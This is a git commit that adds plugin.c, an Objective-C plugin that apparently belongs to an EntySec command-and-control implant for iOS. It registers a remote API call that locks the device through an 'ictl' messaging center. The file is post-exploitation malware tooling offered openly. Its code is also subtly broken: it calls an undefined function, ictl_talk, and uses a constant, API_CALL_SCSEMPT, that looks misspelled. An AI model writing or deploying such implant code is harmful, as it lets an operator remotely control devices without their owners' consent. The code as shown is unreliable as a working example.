11d7852b3b4c025c3e118652711f18c53adcd0e5
Ivan Nikolsky <enty8080@gmail.com>
2023-02-01 17:41:11 +0300

    Create plugin.c

---
+++ plugin.c
@@ -0,0 +1,47 @@
+/*
+ * MIT License
+ *
+ * Copyright (c) 2020-2022 EntySec
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+ * SOFTWARE.
+ */
+
+#import <Foundation/Foundation.h>
+
+#include "c2.h"
+#include "tlv.h"
+
+static NSString *ictl_talk_reply(NSMutableArray *args)
+{
+    CPDistributedMessagingCenter *ictlCenter = [CPDistributedMessagingCenter centerNamed:@"ictl"];
+    NSDictionary *message = [NSDictionary dictionaryWithObject:args forKey:@"args"];
+    NSDictionary *reply = [ictlCenter sendMessageAndReceiveReplyName:@"ictlCenter" message:message];
+    return [reply objectForKey:@"returnStatus"];
+}
+
+static c2_api_call_t *ictl_lock(tlv_transport_pkt_t tlv_transport_packet)
+{
+    ictl_talk([@[@"lock"] mutableCopy]);
+    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, API_CALL_SCSEMPT);
+}
+
+void register_ictl_api_calls(c2_api_calls_t **c2_api_calls_table)
+{
+    c2_register_api_call(c2_api_calls_table, 1, ictl_lock, 1);
+}
